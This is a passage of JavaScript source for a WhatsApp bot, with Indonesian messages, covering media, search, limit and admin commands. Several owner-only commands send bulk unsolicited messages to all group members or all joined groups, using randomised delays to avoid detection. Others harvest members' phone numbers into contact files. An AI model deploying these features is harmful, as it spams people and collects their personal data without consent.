                    }),
                    body: {
                        text: `> Tanggal Rilis: ${chapter.chapterDate}\n> URL: ${chapter.chapterUrl}`,
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Download","id":"noveldl ${chapter.chapterUrl}"}`
                            }
                        ],
                        contextInfo: {
                            mentionedJid: [m.sender], 
                            forwardingScore: 100,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '1@newsletter',
                                newsletterName: ownername,
                                serverMessageId: 143
                            }
                        }
                    },
                });
            }

            let pan = `List Chapter ${title}`;
            let msg = generateWAMessageFromContent(
                m.chat,
                {
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                body: {
                                    text: pan,
                                },
                                carouselMessage: {
                                    cards: cards,
                                    messageVersion: 1,
                                },
                            },
                        },
                    },
                },
                {}
            );

            await Tan.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: msg.key.id,
            });

            if (startIndex + batchSize < maxResults) {
                setTimeout(() => sendBatch(startIndex + batchSize), 2000);
            }
        }

        await sendBatch(0);

    } catch (error) {
        console.error("Error fetching novel details:", error.message);
        return reply("⚠️ Terjadi kesalahan saat mengambil data novel.");
    }

    break;
}
case 'noveldl': {
    if (m.isGroup) { 
        return reply('⚠️ Perintah ini hanya bisa digunakan di *Private Chat*! Silakan kirim pesan langsung ke bot.');
    }
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) {
        return replyTan("Masukkan link halaman detail novel yang valid dari Sakuranovel.");
    }

    replyTan("Sedang mengambil data novel, mohon tunggu...");
    let pdfPath = await dlNovel(text);
    if (!pdfPath) {
        return replyTan('⚠️ Gagal membuat PDF dari novel.');
    }
    await Tan.sendMessage(m.chat, {
        document: { url: pdfPath, mimetype: 'application/pdf' },
        fileName: `${path.basename(pdfPath)}`,
    }, {
        quoted: m,
    });

    fs.unlinkSync(pdfPath);
    break;
}
case 'stickers': {
    if (!text) return replyTan(`Example: ${prefix + command} funny cat`);   
    await loading(); 
    const stickers = await getStickers(text);

    if (stickers.length === 0) return replyTan(`No stickers found for "${text}"`);
    const createImage = async (url) => {
        const { imageMessage } = await generateWAMessageContent({
            image: { url }
        }, {
            upload: Tan.waUploadToServer
        });
        return imageMessage;
    };
    const cards = await Promise.all(stickers.slice(0, 10).map(async (sticker) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `*Title* : ${sticker.title}\n\n*Detail URL* : ${sticker.detailUrl}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(sticker.imageUrl)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: []
        })
    })));
    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `Hasil pencarian stiker untuk "${text}" (max 10 hasil):`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, { quoted: fcall });

    await Tan.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break;
ffmpeg.setFfmpegPath(ffmpegPath);
async function convertGifToVideo(inputGifPath) {
    return new Promise((resolve, reject) => {
        const outputVideoPath = path.join(os.tmpdir(), `${path.basename(inputGifPath, path.extname(inputGifPath))}.mp4`);
        ffmpeg(inputGifPath)
            .output(outputVideoPath)
            .on('end', () => {
                console.log('Conversion finished successfully');
                resolve(outputVideoPath);
            })
            .on('error', (err) => {
                console.error('Error during conversion:', err);
                reject(err);
            })
            .run();
    });
}
case 'pins': {
    if (!checkAndReduceLimit(m, isPrem, isTanOwner)) return;
    if (!text) return replyTan(`Example: ${prefix + command} anime`);
    await loading(); 
    const searchResults = await pinSearch(text);

    if (!Array.isArray(searchResults) || searchResults.length === 0) {
        return replyTan(`Tidak ditemukan hasil untuk "${text}"`);
    }
    const createImage = async (url) => {
        const { imageMessage } = await generateWAMessageContent({
            image: { url }
        }, {
            upload: Tan.waUploadToServer
        });
        return imageMessage;
    };
    const cards = await Promise.all(searchResults.slice(0, 10).map(async (pin) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `*Title*: ${pin.title}\n\n*URL*: ${pin.id}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(pin.imageUrl)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: []
        })
    })));
    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `Hasil pencarian untuk > ${text}`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, { quoted: fcall });

    await Tan.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break;
case 'getcase':
if (!isTanOwner) return reply(mess.only.owner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("Shizuka.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replyTan(`${getCase(q)}`)
break
//=========================================\\
case 'listlimit': {
    if (!isTanOwner) return reply('⚠️ Perintah ini hanya dapat diakses oleh owner.');
    const userDb = readUserDb();
    if (Object.keys(userDb).length === 0) {
        return reply('⚠️ Tidak ada data pengguna dalam database.');
    }
    let message = '> List limit user\n\n';
    Object.keys(userDb).forEach((user, index) => {
        message += `> ${index + 1}. Nomor: ${user.split('@')[0]}\n> Limit: ${userDb[user].limit}\n`;
    });
    reply(message.trim());
}
break;
case 'addlimit': {
    if (!isTanOwner) return reply('⚠️ Perintah ini hanya dapat diakses oleh owner.');
    const [targetNumber, limitToAdd] = args;
    if (!targetNumber || !limitToAdd) {
        return reply(`> Format salah! \n*Contoh* ${prefix + command} 628xxxxxx 10`);
    }
    const userDb = readUserDb();
    const targetUser = `${targetNumber}@s.whatsapp.net`;
    if (!userDb[targetUser]) {
        return reply(`User dengan nomor ${targetNumber} tidak ditemukan di database.`);
    }
    const addedLimit = parseInt(limitToAdd);
    if (isNaN(addedLimit) || addedLimit <= 0) {
        return reply('Jumlah limit yang ditambahkan harus berupa angka positif.');
    }

    userDb[targetUser].limit += addedLimit;
    writeUserDb(userDb);
    reply(`Sukses add ${addedLimit} limit user ${targetNumber}\nTotal limit user sekarang: ${userDb[targetUser].limit}`);
}
break;
case 'banuser': {
    if (!isTanOwner) return reply('⚠️ Perintah ini hanya dapat diakses oleh owner.');
    const targetNumber = args[0];
    if (!targetNumber) {
        return reply(`⚠️ Format salah. Gunakan: ${prefix + command} nomor\n\nContoh: ${prefix + command} 6281234567890`);
    }
    const userDb = readUserDb();
    const targetUser  = `${targetNumber}@s.whatsapp.net`;
    if (!userDb[targetUser ]) {
        return reply(`⚠️ Pengguna dengan nomor ${targetNumber} tidak ditemukan di database.`);
    }
    userDb[targetUser ].limit = 0;
    writeUserDb(userDb);

    reply(`Pengguna ${targetNumber} telah dibanned Memblokir akses `);
}
break;
case 'checklimit': {
    const targetNumber = args[0] ? `${args[0]}@s.whatsapp.net` : m.sender;
    const userDb = readUserDb(); 
    if (!userDb[targetNumber]) {
        return reply(`⚠️ Pengguna dengan nomor ${args[0] || m.sender.split('@')[0]} tidak ditemukan di database.`);
    }
    const userLimit = userDb[targetNumber].limit;
    reply(`✅ Pengguna ditemukan!\nNomor: ${targetNumber.split('@')[0]}\nSisa limit: ${userLimit}`);
}
break;
	case 'addprem': {
if (!isTanOwner) return reply(mess.only.owner)
if (!args[0]) return replyTan(`Use ${prefix+command} number\nExample ${prefix+command} 6281328139682`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Tan.onWhatsApp(prrkek)
if (ceknya.length == 0) return replyTan(`Enter a valid and registered number on WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replyTan(`The Number ${prrkek} Has Been Premium!`)
}
break
//=========================================\\
case 'delprem':
if (!isTanOwner) return reply(mess.only.owner)
if (!args[0]) return replyTan(`Use ${prefix+command} nomor\nExample ${prefix+command} 6281328139682`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
replyTan(`The Number ${ya} Has Been Removed Premium!`)
break
case 'addbadword':{
if (!isTanOwner) return reply(mess.only.owner)
if (args.length < 1) return replyTan('Whats the word?')
if (BadTan.includes(q)) return replyTan("The word is already in use")
BadTan.push(q)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadTan))
replyTan(`Success Adding Bad Word\nCheck by typing ${prefix}listbadword`)
}
break
case 'delbadword':{
if (!isTanOwner) return reply(mess.only.owner)
if (args.length < 1) return replyTan('Enter the word')
if (!BadTan.includes(q)) return replyTan("The word does not exist in the database")
let wanu = BadTan.indexOf(q)
BadTan.splice(wanu, 1)
fs.writeFileSync('./database/bad.json', JSON.stringify(BadTan))
replyTan(`Success deleting bad word ${q}`)
}
break
case 'listbadword':{
let teks = '┌──⭓「 *BadWord List* 」\n│\n'
for (let x of BadTan) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${BadTan.length}*`
replyTan(teks)
}
break
case 'addowner':
if (!isTanOwner) return reply(mess.only.owner)
if (!args[0]) return replyTan(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Tan.onWhatsApp(bnnd)
if (ceknye.length == 0) return replyTan(`Enter A Valid And Registered Number On WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyTan(`Number ${bnnd} Has Become An Owner!!!`)
break
case 'delowner':
if (!isTanOwner) return reply(mess.only.owner)
if (!args[0]) return replyTan(`Use ${prefix+command} nomor\nExample ${prefix+command} 6281328139682`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
replyTan(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
break
case 'listpremium': case 'listprem':
teks = '*Premium List*\n\n'
for (let Tan of prem) {
teks += `- ${Tan}\n`
}
teks += `\n*Total : ${prem.length}*`
Tan.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'setcmd': {
if (!m.quoted) return replyTan('Reply Message!')
if (!m.quoted.fileSha256) return replyTan('SHA256 Hash Missing')
if (!text) return replyTan(`For What Command?`)
let hash = m.quoted.fileSha256.toString('base64')
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replyTan('You have no permission to change this sticker command')
global.db.sticker[hash] = {
text,
mentionedJid: m.mentionedJid,
creator: m.sender,
at: + new Date,
locked: false,
}
replyTan(`Done!`)
            }
            break
case 'delcmd': {
let hash = m.quoted.fileSha256.toString('base64')
if (!hash) return replyTan(`No hashes`)
if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replyTan('You have no permission to delete this sticker command')             
delete global.db.sticker[hash]
replyTan(`Done!`)
            }
            break
case 'listcmd': {
let teks = `
*List Hash*
Info: *bold* hash is Locked
${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. ${value.locked ? `*${key}*` : key} : ${value.text}`).join('\n')}
`.trim()
Tan.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
            }
            break 
case 'lockcmd': {
if (!isTanOwner) return reply(mess.only.owner)
if (!m.quoted) return replyTan('Reply Message!')
if (!m.quoted.fileSha256) return replyTan('SHA256 Hash Missing')
let hash = m.quoted.fileSha256.toString('base64')
if (!(hash in global.db.sticker)) return replyTan('Hash not found in database')
global.db.sticker[hash].locked = !/^un/i.test(command)
replyTan('Done!')
            }
            break
case 'addmsg': {
if (!m.quoted) return replyTan('Reply Message You Want To Save In Database')
if (!text) return replyTan(`Example : ${prefix + command} filename`)
let msgs = global.db.database
if (text.toLowerCase() in msgs) return replyTan(`'${text}' registered in the message list`)
msgs[text.toLowerCase()] = quoted.fakeObj
replyTan(`Successfully added message in message list as '${text}'
    
Access with ${prefix}getmsg ${text}

View list of Messages With ${prefix}listmsg`)
            }
            break
case 'getmsg': {
if (!text) return replyTan(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
let msgs = global.db.database
if (!(text.toLowerCase() in msgs)) return replyTan(`'${text}' not listed in the message list`)
Tan.copyNForward(m.chat, msgs[text.toLowerCase()], true)
            }
            break
case 'listmsg': {
let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
		let teks = ' DATABASE LIST \n\n'
		for (let i of seplit) {
		    teks += `${themeemoji} *Name :* ${i.nama}\n${themeemoji} *Type :* ${getContentType(i.message).replace(/Message/i, '')}\n────────────────────────\n\n`
	        }
	        replyTan(teks)
	    }
	    break
	case 'delmsg': case 'deletemsg': {
	        let msgs = global.db.database
	        if (!(text.toLowerCase() in msgs)) return replyTan(`'${text}' not listed in the message list`)
		delete msgs[text.toLowerCase()]
		replyTan(`Successfully deleted '${text}' from the message list`)
            }
	    break
case 'setexif': {
               if (!isTanOwner) return reply(mess.only.owner)
               if (!text) return replyTan(`Example : ${prefix + command} packname|author`)
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          replyTan(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
            }
            break
case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await Tan.fetchStatus(who)
    replyTan(bio.status)
  } catch {
    if (text) return replyTan(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await Tan.fetchStatus(who)
      replyTan(bio.status)
    } catch {
      return replyTan(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
case 'setppbot': case 'setbotpp': {
if (!isTanOwner) return reply(mess.only.owner)
if (!quoted) return replyTan(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return replyTan(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return replyTan(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
var medis = await Tan.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await Tan.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replyTan(`Success`)
} else {
var memeg = await Tan.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replyTan(`Success`)
}
}
break
case 'creategc': case 'creategroup': {
if (!isTanOwner) return reply(mess.only.owner)
if (!args.join(" ")) return replyTan(`Use ${prefix+command} groupname`)
try {
let cret = await Tan.groupCreate(args.join(" "), [])
let response = await Tan.groupInviteCode(cret.id)
teks = `     「 Create Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}
       `
Tan.sendMessage(m.chat, { text:teks, mentions: await Tan.parseMention(teks)}, { quoted: fcall })
} catch {
replyTan("Error!")
}
}
break
case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
case 'shinobu': case 'handhold': {

axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
Tan.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
            case 'toaud': case 'tomp3': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replyTan(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            if (!quoted) return replyTan(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
            replyTan(`Sedang Proses Permintaan...`)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            Tan.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted: fcall })
            }
            break
            
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) return replyTan(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            if (!quoted) return replyTan(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
            replyTan(`Sedang Proses Permintaan...`)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            Tan.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, { quoted: fcall })
            }
            break
            case 'togif': {
if (!quoted) return replyTan('Reply video')
if (!/webp/.test(mime)) return replyTan(`reply sticker with caption *${prefix + command}*`)
replyTan(`Sedang Proses Permintaan...`)
		let { webp2mp4File } = require('./lib/uploader')
let media = await Tan.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await Tan.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: fcall })
await fs.unlinkSync(media)
            }
            break
            case 'toqr':{
  if (!q) return replyTan(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await Tan.sendMessage(from, { image: medi, caption:"Ini dia!!"}, { quoted: fcall })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
case 'toimg': {
	replyTan(`Sedang Proses Permintaan...`)
	const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
        if (!m.quoted) return replyTan(`_Reply to Any Sticker._`)
        let mime = m.quoted.mtype
if (mime =="imageMessage" || mime =="stickerMessage")
{
        let media = await Tan.downloadAndSaveMediaMessage(m.quoted)
        let name = await getRandom('.png')
        exec(`ffmpeg -i ${media} ${name}`, (err) => {
        	fs.unlinkSync(media)
            let buffer = fs.readFileSync(name)
            Tan.sendMessage(m.chat, { image: buffer }, { quoted: fcall })      
fs.unlinkSync(name)
        })
        
} else return replyTan(`Please reply to non animated sticker`)
    }
    break


case 'delsampah':{
	let path = require('path');
	let directoryPath = path.join();
	fs.readdir(directoryPath, async function (err, files) {
	if (err) {
	console.log('Unable to scan directory: ' + err);
	return reply('Unable to scan directory: ' + err);
	 } 
	let filteredArray = await files.filter(item => item.endsWith("gif") || item.endsWith("png") || item.endsWith("mp3")  || item.endsWith("mp4") || item.endsWith("jpg") ||item.endsWith("webp") ||item.endsWith("webm") || item.endsWith("opus") || item.endsWith("jpeg"))
	console.log(filteredArray.length); 
	let teks =`Terdeteksi ${filteredArray.length} file Kenangan <3\n\n`
	if(filteredArray.length == 0) return reply(`${teks}`)
	filteredArray.map(function(e, i){
	teks += (i+1)+`. ${e}\n`
	})
	 
	reply(`${teks}`)
	
//	await sleep(2000)
	reply("Menghapus file Kenangan...")
	await filteredArray.forEach(function (file) {
	fs.unlinkSync(file)
	});
	//await sleep(2000)
	reply("Berhasil menghapus semua Kenangan <3")
	 
	});
	  }
	break 

case 'qc': {
    if (!q) return replyTan('Enter Text');
    const ppnyauser = await Tan.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/49f2b139a2aff4bb934f7.jpg');
    const json = {
        "type": "quote",
        "format": "png",
        "backgroundColor": "#FFFFFF",
        "width": 512,
        "height": 768,
        "scale": 2,
        "messages": [
            {
                "entities": [],
                "avatar": true,
                "from": {
                    "id": 1,
                    "name": pushname,
                    "photo": {
                        "url": ppnyauser
                    }
                },
                "text": q,
                "replyMessage": {}
            }
        ]
    };

    const res = await axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
    });
    const buffer = Buffer.from(res.data.result.image, 'base64');
    const rest = { 
        status: "200", 
        creator: "AdrianTzy",
        result: buffer
    };

    Tan.sendImageAsSticker(m.chat, rest.result, m, {
        packname: `${global.packname}`,
        author: `${global.author}`
    });
}
break;
case 'obfus': case 'enc': case 'obfuscate':{
if (!q) return replyTan(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
replyTan(`Success
${meg.result}`)
}
break
case 'afk': {
if (!m.isGroup) return reply(mess.only.group)
if (!text) return replyTan(`Example ${prefix+command} want to sleep`)
let user = global.db.users[m.sender]
user.afkTime = + new Date
user.afkReason = args.join(" ")
reply(`${m.pushName} Telah MelMelakukan AFK\nAlasan : ${args.join(" ") ? args.join(" ") : ''}`)
}
break
case 'pushkontakv2':
    if (!isTanOwner) return reply(`Khusus Owner Aja`);
    if (!text) return reply(`Penggunaan Salah! Gunakan format:\n${prefix+command} IDGRUP Pesan\nContoh:\n${prefix+command} 120363362173870431@g.us teks`);
    await reply("Otw Boskuuu");
    const groupIdMatch = text.match(/(\d{10,}@g\.us)/);
    if (!groupIdMatch) return reply("ID Grup tidak valid. Pastikan formatnya benar.");
    const groupId = groupIdMatch[0];
    const messageText = text.replace(groupId, "").trim();
    if (!messageText) return reply("Pesan tidak boleh kosong!");
    try {
        const groupMetadata = await Tan.groupMetadata(groupId);
        if (!groupMetadata) return reply("Gagal mengambil data grup. Pastikan bot ada di grup dan ID benar.");
        const participants = groupMetadata.participants;
        if (!participants || participants.length === 0) return reply("Tidak ada anggota dalam grup.");
        const members = participants.map(v => v.id);
        console.log("Daftar anggota grup:", members);
        const getRandomDelay = () => Math.floor(Math.random() * (10000 - 3000 + 1)) + 3000;

        for (let mem of members) {
            let delay = getRandomDelay();
            await Tan.sendMessage(mem, { text: messageText });

            console.log(`Pesan dikirim ke: ${mem} (Delay: ${delay}ms)`); // Debug log
            
            await sleep(delay);
        }

        reply("Success Boss!");
    } catch (error) {
        console.error("Error saat mengambil data grup atau mengirim pesan:", error);
        reply("Terjadi kesalahan. Pastikan bot ada di grup dan memiliki izin.");
    }
    break;
case 'pushkontak':
    if (!isTanOwner) return reply(`Khusus Owner Aja`);
    if (!m.isGroup) return reply(`*Khusus di grup*`);
    if (!text) return reply(`Penggunaan Salah! Gunakan format:\n${prefix+command} teks\nContoh:\n${prefix+command} Hello grup!`);

    await reply("Otw Boskuuu");

    try {
        const halsss = participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
        global.tekspushkonv4 = text.trim();
        const getRandomDelay = () => Math.floor(Math.random() * (10000 - 3000 + 1)) + 3000;

        for (let men of halsss) {
            let delay = getRandomDelay();     
            if (/image/.test(mime) && quoted) {
                let media = await Tan.downloadAndSaveMediaMessage(quoted);
                let mem = await uptotelegra(media);
                await Tan.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv4 });
            } else {
                await Tan.sendMessage(men, { text: global.tekspushkonv4 });
            }

            console.log(`Pesan dikirim ke: ${men} (Delay: ${delay}ms)`);
           await sleep(delay); 
        }

        reply("Success Boss!");
    } catch (error) {
        console.error("Error saat mengirim pesan:", error);
        reply("Terjadi kesalahan. Pastikan bot ada di grup dan memiliki izin.");
    }
    break;
case 'savekontak': case 'svkontak':
if (!isTanOwner) return reply(`Khusus Owner Ajah`)
if (!m.isGroup) return reply(`Fitur Ini Khusus Group`)
let cmiggc = await Tan.groupMetadata(m.chat)
let orgiggc = participants.map(a => a.id)
vcard = ''
noPort = 0
for (let a of cmiggc.participants) {
    vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`
} // (?); mengimpor kontak seluruh member - save
let nmfilect = './contacts.vcf'
reply('*Mengimpor '+cmiggc.participants.length+' kontak..*')
fs.writeFileSync(nmfilect, vcard.trim())
await sleep(2000)
Tan.sendMessage(m.chat, {
    document: fs.readFileSync(nmfilect), mimetype: 'text/vcard', fileName: 'Contact.vcf', caption: 'GROUP: *'+cmiggc.subject+'*\nMEMBER: *'+cmiggc.participants.length+'*'
}, {ephemeralExpiration: 86400, quoted: m})
fs.unlinkSync(nmfilect)
break
case 'savekontakv2': {
if (!isTanOwner) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
await reply("_Wᴀɪᴛɪɴɢ ɪɴ ᴘʀᴏɢʀᴇss !!_")
const groupMetadataa = !m.isGroup? await Tan.groupMetadata(`${text}`).catch(e => {}) : ""
const participants = !m.isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts))
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(2)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Tan.sendMessage(from, { document: fs.readFileSync("./database/contacts.vcf"), fileName: "contacts.vcf", caption: "Sukses Tinggal Save Ya Kakak", mimetype: "text/vcard", }, { quoted: fcall })
contacts.splice(0, contacts.length)
fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts))
}
}
break

case 'jpm':{
if (!isTanOwner) return reply(`Khusus Owner Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await Tan.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Tan.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Tan.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Tan.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Tan.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN ONWER✅*")
}
break

case 'jpm2':{
if (!isTanOwner) return reply(`Khusus Owner Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await Tan.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Tan.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Tan.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Tan.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Tan.sendMessage(xnxx, { text: text.split('|')[0]})
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN ONWER✅*")
}
break

case 'sendkontak': case 'kontak':
if (!isTanOwner) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return reply(`Khusus Group`)
if (!m.mentionedJid[0]) return reply('Ex; .kontak @tag|nama')
let snContact = {
	displayName: "Contact", contacts: [{displayName: ownername, vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;"+ownername+";;;\nFN:"+ownername+"\nitem1.TEL;waid="+m.mentionedJid[0].split('@')[0]+":"+m.mentionedJid[0].split('@')[0]+"\nitem1.X-ABLabel:Ponsel\nEND:VCARD"}]
} // (?); send kontak
Tan.sendMessage(m.chat, {contacts: snContact}, {ephemeralExpiration: 86400})
break

case 'getcontact': case 'getkontak':
if (!isTanOwner) return reply(`Khusus Owner Aja`)
if (!m.isGroup) return reply(`Fitur Ini Khusus Group`)
